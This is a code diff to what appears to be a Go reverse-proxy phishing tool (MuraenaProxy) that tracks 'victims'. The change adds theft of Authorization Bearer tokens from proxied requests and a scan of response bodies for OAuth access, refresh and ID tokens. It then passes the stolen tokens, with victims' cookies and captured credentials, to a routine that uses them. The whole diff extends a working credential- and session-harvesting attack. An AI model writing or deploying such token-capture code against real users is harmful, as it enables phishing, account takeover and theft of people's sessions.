@@ -106,6 +106,11 @@ func (muraena *MuraenaProxy) RequestBodyProcessor(request *http.Request, track *
 			if found == true {
 				// muraena.Tracker.ShowVictims()
 			}
+
+			// Capture Authorization: Bearer tokens from outgoing requests
+			if _, err := track.ExtractBearerToken(request); err != nil {
+				log.Warning("ExtractBearerToken error: %s", err)
+			}
 		}
 
 		transform := replacer.Transform(bodyString, true, base64)
@@ -455,9 +460,11 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 	//
 	// Trace
 	//
+	var savedTrace *tracking.Trace
 	if muraena.Session.Config.Tracking.Enabled {
 		trace := muraena.Tracker.TrackResponse(response)
 		if trace.IsValid() {
+			savedTrace = trace
 
 			var err error
 			victim, err := muraena.Tracker.GetVictim(trace)
@@ -523,7 +530,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 									if err != nil {
 										log.Error(err.Error())
 									} else {
-										go nb.Instrument(victim.ID, victim.Cookies, string(creds))
+										go nb.Instrument(victim.ID, victim.Cookies, victim.Tokens, string(creds))
 									}
 								}
 							}
@@ -554,6 +561,13 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 
 	// process body and pack again
 	newBody := replacer.Transform(string(responseBuffer), false, base64)
+
+	// Scan response body for OAuth tokens (access_token, refresh_token, id_token, etc.)
+	if savedTrace != nil && muraena.Session.Config.Tracking.Tokens.Enabled {
+		if _, err := savedTrace.ExtractTokens(response, newBody); err != nil {
+			log.Warning("ExtractTokens error: %s", err)
+		}
+	}
 
 	// Ugly Google patch
 	if strings.Contains(response.Request.URL.Path, "AccountsSignInUi/data/batchexecute") {
